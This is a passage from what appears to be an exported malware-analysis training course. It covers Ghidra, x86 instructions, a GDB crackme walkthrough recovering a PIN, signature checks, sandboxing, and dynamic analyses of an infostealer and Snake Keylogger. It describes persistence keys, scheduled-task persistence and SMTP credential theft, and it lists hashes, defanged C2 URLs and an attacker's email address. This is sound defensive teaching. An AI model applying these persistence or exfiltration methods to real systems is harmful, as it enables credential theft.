learn.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools\n"},"Malware-Analysis/C-Binary-Decompiling-with-Ghidra":{"slug":"Malware-Analysis/C-Binary-Decompiling-with-Ghidra","filePath":"Malware Analysis/C Binary Decompiling with Ghidra.md","title":"C Binary Decompiling with Ghidra","links":[],"tags":[],"content":"In the example in this section, the Ghidra tool will be run on a Linux system and the “helloworld” executable file in the previous examples will be decompiled.\nFirst, let’s open the Ghidra tool:\nCommand: `./ghidraRun\n\nAs shown in the image above, the ghidra tool will open when the command at the top of the image is applied on the command line in the directory where the ghidra file is located.\n\n\nGhidra will first ask you for a user agreement that you must confirm when first opened. Continue with the “I Agree” option.\n\nIn order to work on the Ghidra tool, a new project must be opened with “File → New Project”.\n\nSelect the project type and continue with “Next”.\n\nBrowse the path for the project directory, name the project and continue with “Finish”.\n\nThe part that should be used in Ghidra for decompile process is the “CodeBrowser” section. Open it up as shown in the image above.\n\nAfter the CodeBrowser runs import the executable file with the “File → Import File” option in order to start the decompile process.\n\nSelect the executable file and continue with “Select File To Import”.\n\nContinue with “OK” in the above window where some information about the file to be imported is displayed.\n\nContinue with the “Yes” option.\n\nYou are presented with some details about the analysis options. Leave it as it is in its default state and continue with “Analyze”.\n\nYou are presented with some details about the file and now, continue with “OK”. After all these decompile process window will pop open and details about the process is displayed as you can see in the image below: \n\nIn this window, you can see the functions under the “Functions” directory in the “Symbol Tree” section on the left menu. It will be enough to click on the “main” button see the decompiled state of the function in the decompile area on the right. A short-decompiled output was displayed for the “Helloworld” program. Larger programs are likely to have more functions and therefore more decompiled output.\nWith the example above, the source code of the executable file written in C programming language was accessed using the ghidra tool."},"Malware-Analysis/CPU-Instructions":{"slug":"Malware-Analysis/CPU-Instructions","filePath":"Malware Analysis/CPU Instructions.md","title":"CPU Instructions","links":[],"tags":[],"content":"CPU Instructions\nInstructions are the commands in the assembly language. There are a lot different type of instructions for different tasks and purposes. Some may have similar duties. It is vital to know the instructions in order to follow the program flow in the assembly language. Below are some of the instructions and their tasks:\nArithmetic Instructions\nArithmetic instructions are those that perform arithmetic operations between operands. For example, the four arithmetic operations are examples of such transactions.\nADD\nThe “ADD” is the instruction that enables to perform the addition. For example:\n`ADD    ESP, 0x8\nWith the above instruction, 8 is added to the value of the ESP register.\nSUB\nThe “SUB” is the instruction that enables the subtraction. For example:\n`SUB    ESP, 0x4\nWith the above instruction, 4 is subtracted from the value of the ESP register.\nMUL\nThe “MUL” is the instruction that enables multiplication to be performed.\nDIV\nThe “DIV” is the instruction that enables division to be performed.\nINC\nThe “INC” is an instruction that allows you to increment the value of the operand by 1. For example:\n`INC    EBX\nWith the above instruction, the value of the EBX register is incremented by 1.\nDEC\nThe “DEC” is an instruction that allows you to decrement the value of the operand by 1. For example:\n`DEC    EBX\nWith the above instruction, the value of the EBX register is decremented by 1.\nBranch Instructions\nBranch instructions are those that performs the comparison and/or branching. They are vital with respect to follow the program flow in the assembly language. Below are some of these instructions:\nJMP\nThe “JMP” is the instruction that allows branching unconditionally. It takes the memory address as an operand. For example:\n`JMP    0x56556020\nWith the above instruction, the program flow branches to the memory address given as operand (branching).\nJZ/JE\nThe “JZ” and “JE” instructions are among the conditional branching instructions. They stand for: \nJZ = Jump if Zero\nJE = Jump if Equal\nJE and JZ instructions take memory address as operand. For example:\n`JE     0x5555555551b5 &lt;main+277&gt;\nWith the above instruction, the condition for branching to the memory address in the operand is that the zero flag is set to “1” in the form of “ZF=1”.\nJNZ/JNE\nThe “JNZ” and “JNE” instructions are also among the conditional branching instructions. They stand for: \nJNZ = Jump if not Zero\nJNE = Jump if not Equal\nJNE ve JNZ instructions take memory address as operand. For example:\n`JNE    0x565561e7 &lt;main+78&gt;\nThe condition for branching to the memory address in the operand with the above instruction is that the zero flag is set to “0” in the form of “ZF=0”.\nCALL\nThe “CALL” instruction is the instruction used for function call. It takes a function address as an operand. For example:\n`CALL   0x56556199 \nWith the above instruction, the function named “function1” is called. There are 2 basic operations with this instruction:\n\n\nThe address of the instruction after the CALL instruction in the program flow is pushed to the stack (Return address)\n\n\nThe value of the EIP register is set as the function address, so that the program flow branches to the corresponding function.\n\n\nCMP\nThe “CMP” instruction is used for comparison operations. Takes 2 values to compare as operands. For example:\n`CMP    EDX, EAX\nThe above instruction compares the EAX and EDX registers. Depending on the result of the comparison, “Zero Flag(ZF)” and “Carry Flag(CF)” may be changed. The below table shows the conditions that will cause these changes.\n\nData Transfer Instructions\nThere are many data transfer instructions in assembly language that are used for different purposes. Some of these are listed below:\nMOV\nThe “MOV” is the most basic data transfer instruction used to assign a value to a register or to an address in the memory. For example:\n`MOV    EAX, 0x0\nWith the above instruction, the value “0” (zero) is assigned to the EAX register.\nLEA\nThe “LEA” is the instruction used to assign a memory address to the target. It stands for “LEA: Load Effective Address”. For example:\n`LEA    ECX, [esp+0x4]\nWith the above instruction, the memory address is assigned to the ECX register.\nXCHG\nThe “XCHG” instruction allows to exchange values in 2 registers. For example:\n\nEAX = 0x2\nEBX = 0x3\n\nLet the register values be as above.\n`XCHG    EAX, EBX\nAfter the above instruction is executed, the updated values of the registers are as follows:\n\nEAX = 0x3\nEBX = 0x2\n\nPUSH\nThe “PUSH” is the instruction that allows adding data to the stack. For example:\n`PUSH    EDX\n\nAs seen in the image above, the value in the EDX register has been successfully added to the stack with the “PUSH” instruction.\nPOP\nThe “POP” is the instruction that extracts data from the stack. For example:\n`POP    EDX\n\nAs seen in the image above, the data at the top of the stack has been removed from the stack using the “POP” instruction and assigned to the EDX register successfully.\nLogical Instructions\nAssembly language has many instructions that are used for logical operations. Some of these instructions are described below:\nAND\nThe “AND” is the instruction that enables to implement the logical AND operation. For example:\n`AND    ESP, 0xfffffff0\nWith the above instruction, the fixed value and the ESP register are ANDed.\nOR\nThe “OR” is the instruction that enables to implement the logical OR operation. For example:\n`OR    EAX, 0xfffffff0\nWith the above command, the fixed value and the EAX register are ORed.\nXOR\nThe “XOR” is the instruction that enables to execute the logical XOR (exclusive OR) operation. For example:\n`XOR    EBP, EBP\nWith the above instruction, the EBP register is XORed with itself.\nNOT\nThe “NOT” is the instruction that enables to implement the bitwise inversion operation. For example:\nEAX = 0x626c7565 (Hexadecimal)\nLet the EAX register have the above value.\n0x626c7565 ⇒ Binary ⇒ 01100010 01101100 01110101 01100101\n`NOT    EAX\nNew EAX Value = 10011101100100111000101010011010 (Binary)\nNew EAX Value = 0x9d938a9a (Hexadecimal)\nWith the above instruction, the bitwise NOT operation has been executed successfully and with that, the EAX register has a new value.\nNOP Instruction\nThe “NOP” instruction means “no operation” that allows to move on to the next instruction without any operation being executed. It is used alone without the operand.\nNote: More instructions for X86 Assembly architecture can be found at:\nX86 Assembly Instructions: www.aldeid.com/wiki/X86-assembly/Instructions\nX86 Assembly Instructions(Wikipedia): en.wikipedia.org/wiki/X86_instruction_listings#Original_8086/8088_instructions \nWhat is Opcode(Operation Code)?\nOpcode(Operation Code) is a unique value that belongs to each instruction. Thanks to this value, the machine understands which instruction to execute. The following image shows the opcodes of the instructions according to the x86 architecture:\n\nOpcodes are usually expressed in hexadecimal notation. For example, let’s see the opcode of the “NOP” instruction according to the image above:\n\nAfter finding the “NOP” instruction on the image, we should first look at its equivalent on the left lines: “9”, then, check the column equivalent at the top: “0”. The combination of these hexadecimal values creates the opcode: “0x90”.\nNOP Instruction Opcode: 0x90"},"Malware-Analysis/Debugging-with-GDB":{"slug":"Malware-Analysis/Debugging-with-GDB","filePath":"Malware Analysis/Debugging with GDB.md","title":"Debugging with GDB","links":[],"tags":[],"content":"Example of Debugging with GDB\nIn this part of the training, reverse engineering studies will be carried out on a Linux executable file written in C programming language. During these studies, GDB debugger tool will be used mainly. In addition, some tools will be used as auxiliary to GDB.\nBefore starting the reverse engineering process, it is necessary to obtain some information about the executable file to be analyzed. Obtaining information such as which operating system the executable file was compiled for, the type of the file, which programming language it was written in, and whether anti-reversing techniques were applied or not will allow the methods and tools to be used in the reverse engineering process to be selected more accurately. The executable file to be used in the example is the file named “pincode” as you can see in the image below.\n\nLet’s start collecting information about the file by opening the command line in the directory where the file is located, and then we can start the reverse engineering processes.\nThe “file” command is what you can use to get information about files. With the “file” command, you can get variety of information about the file such as its type, etc. Let’s see the “file” command output of the file:\nCommand: `file pincode\n\nAs seen in the image above, the file command output indicates that the file named “pincode” is an “ELF 32-bit” type file. The ELF file type is the type of executable files in Linux. In this section, there is no information about which programming language was used while writing the program. Programming language knowledge will be vital when applying reverse engineering techniques and understanding the code written. Therefore, we need to utilize another tool to determine which programming language is used for this file.\nAnother tool that can be used on each file in the Linux command line is the “strings” tool. The Strings is a very useful tool used to obtain information about files and will help display all the values in the string type in the file. Let’s examine the results by applying the Strings tool on the pincode file:\nCommand: `strings pincode\n\nNote: The output of the Strings command can sometimes be very long. Therefore, it is possible to examine it easier with commands such as “more” that can be applied on the command line in Linux.\nLooking at the “strings” output, some of which can be seen in the image above, we see some familiar function names belonging to the language used as the programming language. In addition, there are some expressions in the program as strings. Some of the information contained in the “strings” output can be very important.\nFor example, a password information used in the program can be included in this output, or if the file is malicious, the IP address of the command and control(C2) server can be included in this section. Knowing all this useful information, let’s continue to examine the “strings” output:\n\nFile extensions in strings can sometimes give us helpful tips. For example, in the image above, we see file names with the extension “.c”, which are the extensions of source code files belonging to more than one C programming language. In this way, we can say that the program is written in the C programming language.\nHaving obtained all this information, let’s run the program and observe its actions and behaviors:\n\nAs seen in the image above, a 4-digit PIN code is requested from the user after the program is run and feedback related to whether the entered PIN code is correct or not is provided back to the user. So far, we were able to obtain some information about the executable without seeing the assembly code with the help of some tools and techniques. It is necessary to examine the codes at the assembly level in order to find out what the correct 4-digit PIN code is in the program. Before examining the executable file dynamically with GDB to find the PIN code, we can see the assembly codes of the functions through the disassembling process, which is a static process. We have used the “objdump” tool here but we could have utilized the GDB as well to get the same results.\nCommand: `sudo objdump -d pincode -M intel\n\nThe above image shows the instructions in the program flow in the “main” function.\nLet’s start debugging via the GDB tool:\n\nAs seen in the image above, the gdb tool started and the “pincode” executable file was imported into gdb. Looking at the list of functions, we can see the function to be debugged with the name “main”.\nLet’s set a breakpoint in the main function with the “b main” command and run the file with the “run” command:\n\nSince the value we want to find in the program flow is the PIN code, we must find the assembly instruction with the comparison in the verification part. For this, we can use the processes we know that are in the program flow as a reference.\nFor example, there are some string values that are printed on the command line and we the user input is received as well. We will have to move forward the program flow as the PIN code comparison comes later than these operations. Let’s advance the program flow to the desired section by executing the “ni” command as required:\n\nAs seen in the image above, the “printf” function which was used for command line printing process was detected. Let’s find the part that we received the user input by advancing the program flow with the “ni” command:\n\nAs seen in the image above, the “scanf” function, which received input from the user, was detected. When we advance the program flow, an input will be received from the user:\n\nAs seen in the image above, input has been received from the user with the “scanf” function. Let’s continue by typing any value in the form of “1111”.\n\nAs we see in the screenshot above, we are at the part where the comparison process is made. The instruction used for the comparison operation is the “CMP” instruction. In the red area above, the input value entered by the user is assigned to the EAX register with the MOV instruction. Next, CMP instruction compares the fixed value which is the correct PIN code and the input entered by the user assigned to the EAX register.\n\nAs seen in the image above, the hexadecimal value of “0x457” was assigned to the EAX register by executing an instruction with the “ni” command. The decimal equivalent of this hexadecimal value is “1111”. The hexadecimal value “0x1b96”, which is the operand of the “CMP” instruction, is the correct PIN code we are looking for and the decimal equivalent of its value is “7062”. We think that the value “7062” we found here in this section is the correct PIN code, but is the value we found really correct? The simplest way to find that out is to run the file and try this value.\n\nAs seen in the image above, the detected PIN code was verified. There is no need to continue further investigation on GDB as we have the answer we are looking for. If we were to continue to investigate, we would reach the section with the string displayed on the screen and then see the assembly codes where the program was terminated."},"Malware-Analysis/Digital-Signature-Analysis":{"slug":"Malware-Analysis/Digital-Signature-Analysis","filePath":"Malware Analysis/Digital Signature Analysis.md","title":"Digital Signature Analysis","links":[],"tags":[],"content":"What is Digital Signature?\nDigital signature is a signature that indicates which vendor has created the executable file. This signature helps distinguish counterfeit executable files from the original ones.\nNote: The topic of what digital signatures mean cryptographically is beyond the scope of this training.\nSignificance of Digital Signatures in Static Malware Analysis\nIn static malware analysis, digital signatures are used to verify that executable files are not malware. Usually, malware does not have a digital signature.  The fact that an executable file is signed by a known vendor often indicates that it is not malware. However, the fact that an executable file has a real signature does not give any accurate information about whether it is malware as the developer can also sign the file. The first thing to consider here is that a valid signature from a known vendor should be present on the file. In some cases, even if the executable file is signed with a valid signature of a known vendor, it may be malware. For example, with “Supply Chain Attacks”, the attacker can use the valid signature of the vendor and release the file as malware. In this case, the malware should be analyzed to determine whether there are behavioral anomalies. If an invalid signature of a known vendor is present on the file, this also indicates a suspicious situation for malware. This is because sometimes vendors’ digital certificates can fall into the hands of malware developers, and they can sign files using the vendor’s now invalid digital certificate (Revoked Certificate) to make their executables appear secure.\nHow to Analyze Digital Signatures on Windows Executable\nThe built-in features of the Windows operating system can be used to view the digital signatures of Windows executable files. For instance, let’s see the digital signature of an executable file:\n\nAs in the image above, the properties menu of the file can be opened by right-clicking on it.\n\nAs seen in the image above, it has been successfully proved that the digital signature belongs to Google.\n\nDetails of the signature can be viewed with the “Details” button as demonstrated in the above image:\n\nThe validity and security of this digital certificate can be checked on VirusTotal. The file is uploaded to VirusTotal and the analysis is initiated. After the analysis is completed, the “Details” tab is accessed:\n\nAs seen in the image above, the verification process of the digital signature of the Windows executable file is successfully performed, and it is determined that the file has a valid signature."},"Malware-Analysis/Dynamic-Analysis-Steps":{"slug":"Malware-Analysis/Dynamic-Analysis-Steps","filePath":"Malware Analysis/Dynamic Analysis Steps.md","title":"Dynamic Analysis Steps","links":[],"tags":[],"content":"Process Activities\nWhen the malware is run, it creates a process of its own like other applications. All operations on the operating system are carried out through a process. Before following other activities, we must detect the processes belonging to the malware.\nA large number of process, network, registry and file activities take place within the operating system. Since it may not be possible to analyze all these activities, we can start analyzing the activities of the malware processes to see if we can find anything solid about its activities.\nWhen examining a process, special attention should be paid to information such as whether it creates a new child process, the DLLs it imports, and which user it is run by.\nYou can use an application called Process Hacker to examine processes.\n\nProcess Hacker makes it easy to examine processes by listing processes in a hierarchical view. When the malware creates a new process, you can see the newly created process under its parent process.\nMalware can inject itself into different processes, perform activities for its own purposes with living of the land binaries, or make legitimate applications run their own applications. For these reasons, the activities of all processes belonging to the malware and used by the malware should be analyzed.\nFor instance, let’s say the malware injects itself into the notepad.exe process after it runs. In this case, we need to examine all of the activities that notepad.exe has created since the moment it was injected.\nTopics like Process Injection will be discussed in the malware analysis trainings.\nNetwork Activities\nMalware often establish a network connection to download the second payload, to communicate with command and control (c2), to jump to other devices in the network, to steal data.\nAt the end of our malware analysis we need to detect these network connections, learn how the malware communicates, and report these network activities.\nWireshark is a software that can meet all your needs for analyzing network activities. However, you may choose tools such as Fiddler, in cases where you know that the malware communicates especially over the HTTP protocol (Malware mostly communicates via protocols such as HTTP, SMTP).\nRegistry Activities\nWe mentioned Registries in the Windows tutorial. Quickly again, registries are hierarchical databases that are used for data storage in Windows operating systems. It is used by attackers for purposes such as stealing data and ensuring persistence.\nWindows keeps applications to run when the operating system is started in some registry keys. Attackers aim to ensure persistence by taking the advantage of this feature of the operating system, and adding their own malicious software to these registry keys.\nSome of these registry keys;\n\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n_HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n\nSince Registries are also used a lot by normal processes, you, specifically need to look at the registry changes made by malicious software processes.\nBy using the application called Regshot, you can detect the changes that the malware has made on the Registries.\n\nBefore executing the malware, you can run Regshot and click the “1st shot” button to let Regshot collect existing registries.\nThen, you should press the “2nd shot” button to get a new shot after running the malware and allowing some time to show activity. You can see the differences between these two shots of Regshot by pressing the “Compare” button.\n\nFile Activities\nMalware performs file activities on the operating system for many reasons. Recently, attackers have developed fileless malware to prevent detection.\nOn Windows, there is a directory called “Temp” where temporary files are located. Applications usually use this directory to host their volatile files. Malware often copies itself to the Temp directory. For this reason, you should pay special attention to the activities performed on this directory.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\n%TEMP%\n\n\nIn order to ensure persistence, malware also copies itself to the Startup directory, which contains applications that will run automatically when the operating system starts. You should pay special attention to the activities performed in these directories.\nYou can access this directory by pressing the “Win ​​+ R” key combination and typing the following command afterwards:\n\nshell:startup\nshell:common startup\n\n\n\n"},"Malware-Analysis/Dynamic-Email-Analysis":{"slug":"Malware-Analysis/Dynamic-Email-Analysis","filePath":"Malware Analysis/Dynamic Email Analysis.md","title":"Dynamic Email Analysis","links":["phishing"],"tags":[],"content":"URLs and files in an email need to be checked to make sure they are safe. The websites and files in the mail should be run in sandbox environments and the changes made to the system should be examined to see if they are harmful or not and in no circumstance should they be run in local host in our network.\nTools\nBrowserling\n\nYou can use online web browsers such as Browserling to quickly check the web addresses in the email. The advantage of such services is that you are not burdened by a possible zero-day vulnerability that would impact browsers, as you are not visiting the website on your own computer. On the other hand, the disadvantage of using web browsers such as Browserling is that if the malicious file is downloaded from the website, you will not be able to run it. This could interrupt your analysis.\n\nBefore going to the links in the email, you should check if there is any important information in the URL. If we examine the example in the image above, and the user’s email address in the email parameter. So even if the user does not enter their password on the phishing page, when they click on popularshoppingsite[.]com and visit the website, the attacker will know that this user is valid. The attacker can increase the success rate of the attack by social engineering the valid users in later attacks. Therefore, it is important to change information such as email addresses before accessing websites.\n\nSandbox Environments\nSandbox environments allow you to examine suspicious files and websites without the risk of infecting your computer with malware. Many sandbox services/products are available for both paid and free use. You can choose one or more of these services according to your needs.\nSome commonly used sandboxes:\n\nVMRay\nCuckoo Sandbox \nJoeSandbox\nAnyRun\nHybrid Analysis(Falcon Sandbox)\n\nSome petty tricks\nMalware can wait a certain amount of time without taking any action to make detection more difficult. You have to wait for the malware to take action before you decide that the file being scanned is not malicious.\nAlso, the fact that there are no URLs and files in the email does not mean that it is not malicious. The attacker may also send the malware as an image to avoid detection by the analysis tools."},"Malware-Analysis/Dynamic-Malware-Analysis-Example-1":{"slug":"Malware-Analysis/Dynamic-Malware-Analysis-Example-1","filePath":"Malware Analysis/Dynamic Malware Analysis Example 1.md","title":"Dynamic Malware Analysis Example 1","links":[],"tags":[],"content":"File Name: e-Archive Dekont.exe\nMD5 Hash: 7a0093c743fc33a5e111f2fec269f79b\nSHA256 Hash: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nYou can use Wireshark and Fiddler to see network activities. Fiddler will suffice, as the malware we reviewed communicates over the HTTP protocol.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nAs we mentioned earlier in our training series, there are some advantages of detecting process activities first. Since we will encounter a lot of logs and activities, the first step we need to do is to detect the processes belonging to the malware.\nWhen we examine the processes occurred over Process Hacker, we see that only one process belonging to the malware is running.\n\nHowever, things are not always as they seem! Since Process Hacker only shows the processes that are running momentarily, the malware may have created a child process at a time we did not monitor and terminated it later.\nAt this point, the Procmon tool comes to our rescue. If you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nThe process tree provided by Procmon completes this shortcoming of Process Hacker, as it also includes terminated processes.\n\nWhen we go over the the image above, we see that the first process we run (9076 PID) runs the tool called “schtasks.exe” belonging to Windows Task Scheduler (PID 4800) and then runs its own malware (7944 PID) again.\nBefore moving on to other activities, let’s examine the schtasks.exe process. Schtasks.exe is a tool that enables the Task Scheduler to be used via the command interface in the Windows operating system. Attackers ensure persistency by adding their own malware to scheduled tasks with the help of Task Scheduler.\nIn order to see what kind of scheduled task the attacker added, we must click on the “schtasks.exe” (4800 PID) in the process tree of procmon and examine its details.\n\nWhen we examine the command-line arguments, we see that a scheduled task named “Updates\\VbxFiQYCyFDgGL” has been created. However, the information of the scheduled task except for its name is in the XML file located at the following path:\n“C:\\Users\\Amanda\\AppData\\Local\\Temp\\tmpCCF2.tmp”.\nClick here to get information about the command-line arguments of the tool named Schtasks.exe.\nWhen you try to access the relevant file, you can see that the file is deleted. But don’t worry, this scheduled task is now saved so we can see it through the Scheduler Task.\n\nOn the Trigger tab, you can see in which situations this scheduled task added by the attacker will run. As it can be seen on the screenshot above this scheduled task will run at log on.\n\nYou can see what action will run on the Actions tab. You can see on the above screenshot that the malicious software named “VbxFiQYCyFDgGL.exe” prepared by the attacker will run when this scheduled task runs.\nThis is how we have detected the scheduled task that the attacker added.\nWe detected malware processes (9076, 4800, 7944 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou filter down the processes with PID values of 9076, 4800, 7944 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nSince the malware we examined communicates over the HTTP protocol, you can detect the connections it establishes very easily using the Fiddler tool.\nAfter running the malware, you can see that the process named “e-archive dekont.exe” on Fiddler communicates with the domain “5gw4d[.]xyz”.\n\nRegistry Activities\nWhen we examine the registry activities, you can see that the keys under HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrrentVersion\\Uninstall are queried. There are settings under this key that are left by the applications installed in the system for uninstall. It is often preferred to enumerate this key to detect applications installed on the system by attackers.\n\nFile Activities\nTo detect malware file activities, disable the other three activities in the top menu of procmon.\n\nYou can enter a filter with Operation=CreateFile to see file creation activities.\nWhen we examine the logs, we see that an executable file named “VbxFiQYCyFDgGL.exe” is written under the “C:\\Users\\Amanda\\AppData\\Roaming” directory.\n\nWhen we look at the hash of the application named “VbxFiQYCyFDgGL.exe” with the tool called HashMyFiles, we see that it is actually the same file as the file we analyzed first. We see that the malware has copied itself to a different folder.\n\nWhen we examine the file activities further, we see that the malware reads the files to steal information from applications such as Firefox, Chome, Thunderbird. We have determined that the malware we have is information stealer.\n\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nthe malware has copied itself to the “C:\\Users\\Username\\AppData\\Roaming” directory with the name “VbxFiQYCyFDgGL.exe”,\nhas used Task Scheduler to ensure persistence,\nhas enabled its own malicious application to run at every logon by creating a scheduled task with the name “VbxFiQYCyFDgGL” \ncommunicates with the command &amp; control server,\nthe command control address is “5gw4d[.]xyz/PL341/index.php” and it communicates over the HTTP protocol,\ndiscovers the applications installed in the system with the help of the key under the “HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall” registry key,\nsteals sensitive data from applications such as Chrome, Firefox, Thunderbird.\n\nArtifacts\nMD5: 7a0093c743fc33a5e111f2fec269f79b\nSHA256: 722ef401e5cbb067c5c33faa402774d3c75ef08e0c8cc4d7e66a9cfa53684088\nFile Name: e-Archive Dekont.exe\nFile Name: VbxFiQYCyFDgGL.exe\nDomain: 5gw4d[.]xyz\nURL: http[:]//5gw4d[.]xyz/PL341/index.php"},"Malware-Analysis/Dynamic-Malware-Analysis-Example-2":{"slug":"Malware-Analysis/Dynamic-Malware-Analysis-Example-2","filePath":"Malware Analysis/Dynamic Malware Analysis Example 2.md","title":"Dynamic Malware Analysis Example 2","links":[],"tags":[],"content":"File Name: Sales Order Sheet.pdf.exe\nMD5 Hash: 411019bcb582ef6e3dab080d99925b4b\nSHA256 Hash: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nPreparing\nBecause our monitoring tools list all the activities that have been done since the time the malware was run, we should run these tools before executing the suspicious program we have. Otherwise, we will not be able to see malicious activities on these tools even though they carry out malicious software activities.\nLet’s run our tool called ‘Process Hacker’ to see the process activities. Because we will run the malware by clicking on the desktop, we will see the process belonging to the malware under the explorer.exe process, so we need to pay special attention to it.\n\nTo see the file activities, run the tool called “Procmon” in the SysInternals toolkit. This tool allows us to see process, file, registry and network activities. However, since there are so many logs, it can be difficult to read and conclude meaningful results. (Yes, even if you don’t see it, your OS really works that much in the background!)\n\nRun RegShot to see registry activities. Take a shot by pressing the “1st shot” button before running the malware. This process will take some time.\n\nOpen the Wireshark application to see network activities.\n\nAnalyze\nNow that we have completed the necessary preparations before running the malware, you can run the malware on your VM.\nFor a better understanding, we will examine the process, network, registry and file activities separately. After reviewing these activities, we will create a timeline.\nAfter allowing enough time for the malware to perform its activity, let’s take the second shot by pressing the “2nd shot” button from the Regshot tool.\n\nProcess Activities\nWhen we examine the running processes using Process Hacker, we see that only 1 process belonging to the malware is running.\n\nLike in our previous example, the malware may have created a different process, but we may not be able to see it because it is not running instantly. Let’s confirm this behavior using the procmon tool.\nIf you press the “Show Process Tree” button in the top menu, procmon will show the process tree it has created for you during the time it has recorded.\n\nAs we can see in the image above, we see that the first process we run (8780 PID) has a child process (7100 PID) named “regsvcs.exe”.\nRegsvcs.exe is a tool called .NET Service Installation Utility, which is installed by default in Windows operating systems by Microsoft.\nAttackers often name applications that come by default in the operating system to avoid detection. We have to determine whether the malware we are examining is really the legitimate application that comes by default in Windows or it is how the attacker named his own software to prevent detection.\n\nWhen we examine the path information of the process, we see that the actual directory where the RegSvcs.exe tool, which comes by default in the Windows operating system appears. But, we still need to do a hash check to verify this.\nLet’s get the hash of “C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe” with the help of the tool named HashMyFile.\n\nWhen we search the hash on VirusTotal, we see the the information that states the relevant application has been published by Microsoft.\n\nWe have determined that the running application is indeed an application published by Microsoft. So does this mean the app is safe?\nAttackers can inject malicious code into legitimate applications by using techniques such as Code Injection, Process Hollowing, Reflective DLL Injection that allow these applications to run the malicious codes. In addition, there are binaries that are called “living of the land binary” and that allow malicious activities to be carried out without injecting malicious code.\nWe can assume that our malware creates this process to perform a malicious activity since it’s created by malware. However, we must always support our assumptions with valid evidence. The next time when we examine network, registry activities, we will prove that this process is indeed used for malicious purposes.\nWe detected malware processes (8780, 7100 PIDs) with the help of Procmon. Next, we need to detect the network, file and registry activities of these processes.\nYou can filter down processes with PID values ​​of 8780, 7100 on Procmon. However, there is an easier method. When you right-click on the top parent process of the malware and press the “Add process and children to Include filter” button, procmon will create these filters for you.\n\nNetwork Activities\nBefore performing our analysis on Wireshark, let’s check to see if the malware makes any web requests, as it can be examined more easily.\nWhen we look at the Fiddler application, we see that there is a web request made by the malware (regsvcs.exe, 7100 PID).\n\nWhen we examine the web request, we see that the malware makes a request to checkip.dyndns.org in order to find the public IP address. Attackers often use IP address learning services to perform targeted attacks or learn the victim’s IP address. This behavior may be considered commonplace for malware.\nDid you notice the name of the process making the web request? “Regsvcs.exe” should not throw such a request in normal use.\nWhen we examine the network activities over Wireshark, we see that there is SMTP traffic. SMTP is the protocol used for sending email. Since we didn’t send email, we can say that this is a very suspicious traffic.\n\nYou can clearly see all SMTP traffic by right-clicking on any SMTP packet and clicking “Follow” then “TCP Stream”.\n\nIf we examine the SMTP traffic, we find that the malware connects to skychine[.]com[.]my’s mail server and sends email to graceunlimited153@gmail[.]com with “Pc Name: admin | Snake Keylogger”.\n\nWhen we look at the content of the mail, we see that there are multiple attachments with names such as “Password.txt”, “User.txt”. In order to bring the contents to readable format, we have to base64 decoding.\n\nAs you can see from the subject title and email content, the malware we analyzed is actually Snake Keylogger.\nWhen we look at the e-mail content, we can see that the malware sends the user name, password information of the web applications and the IP address of the device.\nAttackers often send the information they have obtained to their own email addresses using SMTP servers that they have previously seized. In other words, the skychine[.]com[.]my domain name is actually an SMTP server that is not malicious but is hijacked by the attacker and used for malicious purposes. However, since the email sent was sent to the attacker’s email address, the graceunlimited153@gmail.com address most likely belongs to the attacker.\nResult\nNow that we have completed the malware analysis, we can combine the information we have gathered. We have detected that:\n\nIt’s Snake Keylogger\nSteals credentials from browsers\nChecks IP address\nExfiltrates data via SMTP\nConnects skyshine.com[.]my:25\n\nArtifacts\nMD5: 411019bcb582ef6e3dab080d99925b4b\nSHA256: f381e338212079c3a03fbbb532cdec44b1d27db03e8cc4c47408ef038885d934\nFile Name: Sales Order Sheet.pdf.exe\nDomain: checkip.dyndns.org\nDomain: skyshine[.]com[.]my"},"Malware-Analysis/File-format-analysis":{"slug":"Malware-Analysis/File-format-analysis","filePath":"Malware Analysis/File format analysis.md","title":"File format analysis","links":[],"tags":[],"content":"What is File Format?\nFiles have their own unique structure. Each different file type has a different number and length of fields. In order for programs to interpret and extract meaningful information from files, a specific file structure known as the “File Format” is essential. Operating systems require knowledge of this file format to read files correctly. Without understanding the file format, the operating system cannot accurately parse the file’s fields or comprehend the data contained within it. For instance, Windows executable files with the “.exe” extension cannot be directly executed on Linux. Additional tools that can parse the file format are needed to run them.\nSignificance of File Format in Static Malware Analysis\nIn static malware analysis, understanding the file format of the malware is crucial. The file format provides valuable information about which operating system the malware is aimed at and/or which software can be used to run the malware. For example, when a malware with “.exe” extension is encountered, it indicates that the malware is designed for the Windows operating system. Similarly, when a 